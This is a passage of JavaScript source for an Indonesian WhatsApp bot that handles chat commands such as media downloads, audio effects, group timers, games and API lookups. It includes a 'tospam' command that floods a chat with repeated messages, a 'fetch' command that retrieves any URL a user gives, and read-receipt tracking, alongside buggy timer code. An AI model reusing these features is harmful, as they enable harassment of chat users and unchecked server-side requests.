reply('Berhasil tersambung dengan WhatsApp - mu.\n*NOTE: Ini cuma numpang*\n' + JSON.stringify(user, null, 2))
})
} catch {
reply('Error! hanya 1 orang yang dapat mengakses fitur jadibot')
}
break
case 'stopjadibot':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
try {
reply('Oke')
fs.unlinkSync(`./sampah/${sender}.json`)
client.close()
} catch {
reply('Oke')
client.close()
}
break
case 'owner':
	case 'creator':
case 'developer':
		case 'author':
let ini_list = []
for (let i of ownerNumber) {
const vname = wann.contacts[i] != undefined ? wann.contacts[i].vname || wann.contacts[i].notify : undefined
ini_list.push({
"displayName": `Developer ${NamaBot}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;WANN OFC;;;\nFN:${vname ? `${vname}` : `${wann.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
wann.sendMessage(from, {
"displayName": `Developer ${NamaBot}`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
break
case 'addcmd': 
case 'setcmd':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
if (isQuotedSticker) {
if (!c) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, c)
reply("Done Bwang")
} else {
reply('tag stickenya')
}
break
case 'rules':
menu = `
*── 「 RULES AND FAQ 」 ──*

1. Jangan spam bot. 🙅
Sanksi: *⚠️ WARN/SOFT BLOCK*

2. Jangan telepon bot. ☎️
Sanksi: *❎ SOFT BLOCK*

3. Jangan mengeksploitasi bot.😖
Sanksi: *‼️ PERMANENT BLOCK ‼️*

🗯️ Bot tidak atau lambat merespon ?
➡️ Mungkin dipengaruhi oleh jaringan, signal, banned oleh Whatsapp dan beberapa asalan. Tetap patuhi rules‼️

🗯️ Dimana saya bisa mendapatkan Script dari bot ini ?
➡️ Script ini masih private dan tidak pernah diperjual belikan ,bijaklah dalam mengetahui penipu.

🗯️ Prefixnya apa ya?
➡️ Bot ini menggunakan multi prefix. Berarti anda bisa menggunakan prefix #, . , Dan prefix wajar lainnya.

🗯️ Kak, kok syaa chat owner tidak direspon?
➡️ Owner hanya merespon pertanyaan seputar bot Dan kendala eror, tidak untuk kenalan ataupun mengemis script.


Jika sudah dipahami rules-nya, silakan ketik *${prefix}allmenu* untuk memulai!

⚠️ Segala kebijakan dan ketentuan Invibot di pegang oleh owner dan segala perubahan kebijakan, sewaktu waktu owner berhak mencabut, memblokir user(*﹏*) 

Arigatou Gozaimasu! Untuk kalian user ramah dan Beberapa orang yg ikut membantu juga dalam project pembuatan Alphabot
😖🙏
    `
grupinv(menu)
break
case 'delcmd':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
reply("Done Bwang")
break
case 'listcmd':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
let teksnyee = `\`\`\`「 LIST CMD STIC 」\`\`\``
let cemde = [];
for (let i of scommand) {
cemde.push(i.id)
teksnyee += `\n\n*❏ ID :* ${i.id}\n*❏ Cmd :* ${i.chats}`
}
reply(teksnyee)
break
				case 'script':
		case 'sc':
		case 'sourcecode':
		wann.sendMessage(from, { text: "https://github.com/X-Invibotz", matchedText: 'https://github.com/X-Invibotz', description: "", title: "don't click here !!!", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
       case 'debug':
			 res = await wann.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi ${pushname} 👋,\n\n${tampilTanggal} `,
							"hydratedFooterText": `${NamaBot}`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
										"displayText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 0
								},
								{
									"quickReplyButton": {
										"displayText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								}
							]
						}
					}
				}, {}) 
wann.relayWAMessage(res)
break
case 'debug2':
   res = await wann.prepareMessageFromContent(from,{
"templateMessage": {
  "hydratedFourRowTemplate": {
    "hydratedContentText": "",
    "hydratedFooterText": "",
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": "",
          "url": ""
        },
        "index": 0
      }
    ]
  },
  "hydratedTemplate": {
    "hydratedContentText": `Hi ${pushname} 👋,\n\n${tampilTanggal} `,
    "hydratedFooterText": `${NamaBot}`,
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": `Script ${NamaBot}`,
          "url": "https://github.com/dcode-denpa"
        },
        "index": 0
      }
    ]
  }
}
}, {})
wann.relayWAMessage(res)
break
case 'ig':
case 'igdl':
case 'instagram':
if (!c) return reply('Linknya?')
var { igDownloader } = require('./lib/igdown')
   res = await igDownloader(`${c}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from,`${res.result.link}`,`${res.result.desc}`)
                    break
                    case 'tiktok':
                   case 'tiktokdl':
                   case 'tiktoknowm':
if (!c) return reply('Linknya?')
var { TiktokDownloader } = require('./lib/tiktokdl')
reply(mess.wait)
res = await TiktokDownloader(`${c}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from, `${res.result.nowatermark}`)
break
                    case 'tourl':
    if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await wann.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break
            case 'viewonce':
res = await wann.prepareMessageFromContent(from,{
"viewOnceMessage": {
"message": {
"imageMessage": {
"mimetype": 'image/jpeg',
"jpegThumbnail": dfrply,
"viewOnce": true
}
}
}
}, {}) 
wann.relayWAMessage(res)
break
case 'pinterest':
if (!c) return reply('yg mau di cari apa?')
pinterest(`${c}`).then( data => {
const amsulah = data.result
const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
sendMediaURL (from ,pimterest , `Pinterest : ${c}`)
})
break
case 'isbaileys': 
case 'bail': 
case 'baileys':
reply(`${mek.quoted.isBaileys}`)
break
case 'getcaption':
try {
reply(`${mek.quoted.title}`)
} catch {
reply(`${mek.quoted.caption}`)
}
break
case 'q': 
    if (!m.quoted) return reply('reply pesan!')
    let qse = wann.serializeM(await m.getQuotedObj())
    if (!qse.quoted) return reply('pesan yang anda reply tidak mengandung reply!')
    await qse.quoted.copyNForward(m.chat, true)
break
case 'listgc':
case 'gclist':
case 'listgroup':
                case 'listgrup':
                case 'listgrop':
                case 'gruplist':
                case 'groplist':
                case 'grouplist':
  const txs = wann.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${wann.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
  reply(txs)
  break
  case 'caripesan':
if (args.length < 1) return reply(`Penggunaan ${prefix}caripesan Hi|15`)
tekse = args.join('')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 15) return reply('maksimal 15')
sampai = `${za}`
batas = parseInt(sampai) + 1
cok = await wann.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Pesan tidak ditemukan!') 
if (cok.messages.length < parseInt(batas)) reply(`Hanya ditemukan ${cok.messages.length - 1} Pesan`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
wann.sendMessage(from, `Nih pesannya!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
return reply(mess.error.api)
}
} else {
reply(`Penggunaan ${prefix}caripesan Hi|15`)
}
break
  case 'get':
case 'fetch':
            if(!c) return reply('Linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            reply(bu)
            })   
            break
            case 'autorespon':
      if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Penggunaan ${prefix}autorespon on/off`)
           if (c === 'on'){
              autorespon = true
              multi = true
              allpref = false
              nopref = false
                    reply(`Berhasil mengaktifkan autorespon`)
                } else if (c === 'off'){
                    autorespon = false
                    multi = false
              allpref = true
              nopref = false
                    reply(`Berhasil menonaktifkan autorespon`)
                } else {
                    reply(mess.error.api)
                }
                break
                case 'antidelete':
      if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Penggunaan ${prefix}antidelete on/off`)
           if (c === 'on'){
             antidelete = true
                    reply(`Berhasil mengaktifkan antidelete`)
                } else if (c === 'off'){
                    antidelete = false
                    reply(`Berhasil menonaktifkan antidelete`)
                } else {
                    reply(mess.error.api)
                }
                break
                case 'autoread':
      if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Penggunaan ${prefix}autoread on/off`)
           if (c === 'on'){
             autoread = true
                    reply(`Berhasil mengaktifkan autoread`)
                } else if (c === 'off'){
                    autoread = false
                    reply(`Berhasil menonaktifkan autoread`)
                } else {
                    reply(mess.error.api)
                }
                break
                case 'fakengetik':
      if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Penggunaan ${prefix}fakengetik on/off`)
           if (c === 'on'){
             autocomposing = true
                    reply(`Berhasil mengaktifkan fakengetik`)
                } else if (c === 'off'){
                    autocomposing = false
                    reply(`Berhasil menonaktifkan fakengetik`)
                } else {
                    reply(mess.error.api)
                }
                break
                case 'fakevn':
      if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Penggunaan ${prefix}fakevn on/off`)
           if (c === 'on'){
             autorecording = true
                    reply(`Berhasil mengaktifkan fakevn`)
                } else if (c === 'off'){
                    autorecording = false
                    reply(`Berhasil menonaktifkan fakevn`)
                } else {
                    reply(mess.error.api)
                }
                break
                case 'setprefix':
      if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
       if (args.length < 1) return sendButMessage(from, `\`\`\`「 PREFIX SETTING 」\`\`\``, `Silahkan pilih salah satu`, [
          {
            buttonId: `setprefix multi`,
            buttonText: {
              displayText: `Multi Prefix`,
            },
            type: 1,
          },
          {
            buttonId: `setprefix nopref`,
            buttonText: {
              displayText: `No Prefix`,
            },
            type: 1,
          },
          {
            buttonId: `setprefix allpref`,
            buttonText: {
              displayText: `All Prefix`,
            },
            type: 1,
          },
        ], {quoted:foncevid})
           if (c === 'multi'){
              multi = true
              allpref = false
              nopref = false
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else if (c === 'nopref'){
                    multi = false
                    allpref = false
                    nopref = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                   } else if (c === 'allpref'){
                   	allpref = true
                   nopref = false
                   multi = false
                   reply(`Berhasil mengubah prefix ke ${c}`)
                } else {
                    multi = false
                    nopref = false
                    allpref = false
                    prefa = `${c}`
                    reply(`Berhasil mengubah prefix ke ${c}`)
                }
                break
        case 'closetime'://====Dari Pena bot=====\\

      if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroupAdmins && !toll.key.fromMe) return reply("Khusus admin");
        if (!isGroup) return reply("Khusus di grup");		 
        reply("AKSES WAKTU DIPROSES")   	
                wann.updatePresence(from, Presence.composing) 
                if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"0000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				setTimeout( () => {
				var nomor = mek.participant
				const close = {
				text: `*ᴛᴇᴘᴀᴛ ᴡᴀᴋᴛᴜ* ɢʀᴜᴘ ᴅɪᴛᴜᴛᴜᴘ ᴏʟᴇʜ ᴀᴅᴍɪɴ @${nomor.split("@s.whatsapp.net")[0]}\nꜱᴇᴋᴀʀᴀɴɢ *ʜᴀɴʏᴀ ᴀᴅᴍɪɴ* ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɪʀɪᴍ ᴘᴇꜱᴀɴ`,
				contextInfo: { mentionedJid: [nomor] }
				}
				wann.groupSettingChange(from, GroupSettingChange.messageSend, true);
				reply(close)
				}, timer)
				break 
case 'opentime'://====Dari Pena bot=====\\  

		     	if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (!isGroup) return reply("Khusus di grup");		    
                reply("AKSES WAKTU DIPROSES")   
                wann.updatePresence(from, Presence.composing) 
                if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"00000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				setTimeout( () => {
				var nomor = mek.participant
				const open = {
				text: `*ᴛᴇᴘᴀᴛ ᴡᴀᴋᴛᴜ* ɢʀᴜᴘ ᴅɪʙᴜᴋᴀ ᴏʟᴇʜ ᴀᴅᴍɪɴ @${nomor.split("@s.whatsapp.net")[0]}\nꜱᴇᴋᴀʀᴀɴɢ *ᴍᴇᴍʙᴇʀ* ᴅᴀᴘᴀᴛ ᴍᴇɴɢɪʀɪᴍ ᴘᴇꜱᴀɴ`,
				contextInfo: { mentionedJid: [nomor] }
				}
				wann.groupSettingChange(from, GroupSettingChange.messageSend, false);
				reply(open)
				}, timer)
				break
case 'linkwa':

if(!q) return reply('cari group apa?')
hx.linkwa(q)
.then(result => {
let res = '*「 _LINK WA_ 」*\n\n'
for (let i of result) {
res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
reply(res)
});
break
case 'tes':
        sendButMessage(from, `Siap Lapor!, Bot Aktif!`, `Nah kak silahkan pilih salah satu tombol di bawah`, [
          {
            buttonId: `${prefix}runtime`,
            buttonText: {
              displayText: `⬡ RUNTIME `,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}menu`,
            buttonText: {
              displayText: `⬡ MENU`,
            },
            type: 1,
          },
        ]);
        break
				case 'runtime':
				runtime = process.uptime()
				reply(`- Active!\n${waktu(runtime)}`)
				break
				case 'tictactoe':
case 'ttt':
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('Tag Lawan Anda! ')
if (isTTT) return reply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target Lawan!')
ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
player1 = sender
player2 = ment[0]
angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
id = from
gilir = player2
ky_ttt.push({player1,player2,id,angka,gilir})
wann.sendMessage(from, `*🎳 Memulai Game Tictactoe 🎲*

[@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
Ketik Y/N untuk menerima atau menolak permainan

Ketik ${prefix}delttc , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})
break
                case 'delttt':
                case 'delttc':
if (!isGroup) return reply(mess.only.group)
if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa 
reply('Sukses')
break
				case 'getpp':
					anu = from
		if (`${anu}@s.whatsapp.net`) {
		try {
					ppimg = await wann.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				ano = await wann.getProfilePicture(anu)
				buffer = await getBuffer(ano)
				wann.sendMessage(from, buffer, image, {quoted: mek})
		} else {
		}
			  break
				case 'public':
				if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
			banChat = true
				reply('「 *PUBLIC-MODE* 」')
			break
			case 'self':
			if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
				banChat = false
				reply('「 *SELF-MODE* 」')
			break
		case 'gimage':
case 'googleimage':
if (args.length < 1) return reply('Apa Yang Mau Dicari?')
reply(mess.wait)
teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: mek, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
break
				case 'herolist':
await herolist().then((ress) => {
let listt = `*List hero untuk feature ${prefix}herodetail*\n\n`
for (var i = 0; i < ress.hero.length; i++) {
listt += '-  ' + ress.hero[i] + '\n'
}
reply(listt)
})
break
case 'herodetail':
res = await herodetails(body.slice(12))
her = `*Hero Details ${body.slice(12)}*

*Nama* : ${res.hero_name}
*Role* : ${res.role}
*Quotes* : ${res.entrance_quotes}
*Fitur Hero* : ${res.hero_feature}
*Spesial* : ${res.speciality}
*Rekomendasi Lane* : ${res.laning_recommendation}
*Harga* : ${res.price.battle_point} [Battle point] | ${res.price.diamond} [DM] | ${res.price.hero_fragment} [Fragment]
*Rilis* : ${res.release_date}

*Durability* : ${res.skill.durability}
*Offence* : ${res.skill.offense}
*Skill Effect* : ${res.skill_effects}
*Difficulty* : ${res.skill.difficulty}
 
*Movement Speed* : ${res.attributes.movement_speed}
*Physical Attack* : ${res.attributes.physical_attack}
*Magic Defense* : ${res.attributes.magic_defense}
*Ability Crit Rate* : ${res.attributes.ability_crit_rate}
*HP* : ${res.attributes.hp}
*Mana* : ${res.attributes.mana}
*Mana Regen* : ${res.attributes.mana_regen}

*Story* : ${res.background_story}`
reply(her)
break
				case 'google':
case 'googlesearch':
case 'ggs':
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = args.join(' ')
reply(mess.wait)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
case 'wiki':
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
  reply(result)
})
break
case 'mediafire':
if (args.length < 1) return reply('Link Nya Mana? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.api)
if (Number(filesize) >= 30000) return reply(`*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}
*Link :* ${res[0].link}

_Maaf size melebihi batas maksimal, Silahkan klik link diatas_`)
reply(mess.wait)
teks = args.join(' ')
res = await mediafireDl(teks)
result = `*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}

_File sedang dikirim, Silahkan tunggu beberapa menit_`
reply(result)
sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
break
				case 'kalkulator':
				 var mtk = body.slice(12)
				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 break
				case 'translate':
				case 'ts':
					try{
					if ( args.length === 1 ){
						tekss = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
						translate(tekss, {client: 'gtx', to:args[0]})
						.then((res) =>{
							reply(res.text)
							}) 
						} else
			if(args.length > 0 ) {
				ngab = args.join(' ')
			teks = ngab.split(' ')[0];
			bhs = ngab.split(' ')[1];
			  translate(teks, {client: 'gtx', to:bhs})
			  .then((res) =>{
				  reply(res.text)
				  })
				}
			} catch (e){
				reply(mess.error.api)
			}
				  break
		case 'artimimpi':
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/artimimpi?q=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
case 'artinama':
                if (args.length < 1) return reply('Apa yang mau dicari um?')
                teks = q
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/arti?nama=${teks}`, {method: 'get'})
					reply(`Arti Nama ${teks}\n\n`+anu.result)
				break
				case 'fancytext':
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
case 'lirik':
if (args.length < 1) return reply('Judulnya?')
reply(mess.wait)
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `${res[0].result}`
reply(lirik)
})
break
				case 'bilangangka':
				if (args.length < 1) return reply('Angkanya?')
				var teks = body.slice(13)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/bilangangka?angka=${teks}&apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'pantun':
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/pantun?apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'resepmasakan':
				if (args.length < 1) return reply('Judulnya?')
				var teks = body.slice(14)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
					hasilresep = `❏ *${anu.results.title}*\n\n❏ Porsi : ${anu.results.servings}\n❏ Waktu : ${anu.results.times}\n❏ Kesulitan : ${anu.results.dificulty}\n❏ Pengguna : ${anu.results.author.user}\n❏ Tanggal Diterbitkan : ${anu.results.author.datePublished}\n❏ Deskripsi : ${anu.results.desc}\n\n────────────────────\n❏ *Tutorial*\n\n❏ Bahan : ${anu.results.ingredient}\n❏ Langkah : ${anu.results.step}`
					reply(mess.wait)
					buff = await getBuffer(anu.results.thumb)
					wann.sendMessage(from, buff, image, {quoted: ftok, caption: hasilresep})
					break 
					case 'ghstalk': 
            case 'githubstalk': 
            case 'ghuser':
               {
                if (args.length < 1) return reply(`Kirim perintah *${prefix}ghstalk* _username_`)
                reply(mess.wait())
                axios.get(`https://api.github.com/users/${args[1]}`)
                .then((res) => res.data)
                .then((res) =>{
                    let { login, type, name, followers, following, created_at, updated_at, public_gists, public_repos, twitter_username, bio, hireable, email, location, blog, company, avatar_url, html_url } = res
                    let txt = `*GITHUB STALKING*

*Data Berhasil Didapatkan!*
▷ Username : ${login}
▷ Name : ${name}
▷ Followers : ${followers}
▷ Following : ${following}
▷ Created at :  ${moment(created_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}
▷ Updated at : ${moment(updated_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}
▷ Public Gists : ${public_gists}
▷ Public Repos : ${public_repos}
▷ Twitter : ${twitter_username}
▷ Email : ${email}
▷ Location : ${location}
▷ Blog : ${blog}
▷ Link : ${html_url}
▷ Bio :\n${bio}`
                    sendFileFromUrl(from, avatar_url, txt, mek)
                      })
                .catch((err) => {
                    sendMess(owner, 'Error : ' + err)
                    console.log(color('[ EXEC ]', 'red'), err)
					reply(mess.error.api)
                })
            }
                break
					case 'infogempa':
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=${HunterApi}`, {method: 'get'})
					gempa = `❏ *INFO GEMPA*\n\n❏ Waktu : ${anu.result.Waktu}\n❏ Lintang : ${anu.result.Lintang}\n❏ Bujur : ${anu.result.Bujur}\n❏ Magnitudo : ${anu.result.Magnitudo}\n❏ Kedalaman : ${anu.result.Kedalaman}\n❏ Wilayah : ${anu.result.Wilayah}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.Map)
					wann.sendMessage(from, buff, image, {quoted: ftok, caption: gempa})
					break 
				case 'dadu':
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			wann.sendMessage(from, damdu, sticker, {quoted: mek})
			break
				case 'robot':
encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medial = await wann.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
wann.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
case 'gemuk':
					encmediaz = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaz = await wann.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaz)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					wann.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
					break
case 'balik':
	encmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	mediau = await wann.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mediau} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediau)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
wann.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:mek})
fs.unlinkSync(ran)
	})
break
case 'bass':                 
					encmediao = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediao = await wann.downloadAndSaveMediaMessage(encmediao)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediao} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediao)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						wann.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
				break
case 'sider':
if (!isGroup) return reply(mess.only.group)
infom = await wann.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
case 'tospam':
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  wann.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  wann.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await wann.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  wann.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await wann.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  wann.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await wann.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
